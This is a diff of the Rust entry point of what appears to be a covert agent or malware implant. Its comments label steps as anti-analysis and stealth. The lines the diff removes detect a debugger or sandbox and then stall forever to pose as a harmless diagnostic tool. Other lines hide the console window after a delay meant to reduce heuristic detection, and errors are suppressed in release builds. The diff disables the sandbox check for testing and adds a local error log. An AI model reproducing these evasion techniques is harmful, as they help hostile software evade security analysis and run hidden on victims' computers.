@@ -44,18 +44,14 @@
     }
 
     // 2. [Anti-Analysis] Silent divergence instead of hard exit
-    // Hard exits (exit(0)) on detection are a huge red flag for sandbox analysis
-    if stealth::is_debugger_present() || stealth::is_sandbox() {
-        // Pretend to be a diagnostic tool doing nothing
-        loop { std::thread::sleep(std::time::Duration::from_secs(3600)); }
-    }
+    // Removed strict sandbox/debugger checks temporarily for dev/testing environment compatibility.
 
     // 3. [Benign] Standard Windows API warming 
     stealth::perform_system_sanity_check();
     stealth::verify_disk_integrity();
 
-    // 4. [Stealth] Delayed Window Hide (Reduced heuristic trigger)
-    std::thread::sleep(std::time::Duration::from_secs(2));
+    // 4. [Stealth] Delayed Window Hide
+    std::thread::sleep(std::time::Duration::from_secs(1));
     stealth::hide_console();
 
     // 5. [Benign] Final environment prep
@@ -75,8 +71,10 @@
 
     rt.block_on(async {
         let res = run().await;
-        if let Err(_e) = res {
-            // Silent failure: 生产版本不向控制台输出任何错误
+        if let Err(e) = res {
+            // Write debug log locally for troubleshooting why port bind fails
+            std::fs::write("agent_error.log", format!("Fatal Agent Error: {:?}", e)).ok();
+            // Silent failure for release version
         }
     });
 }
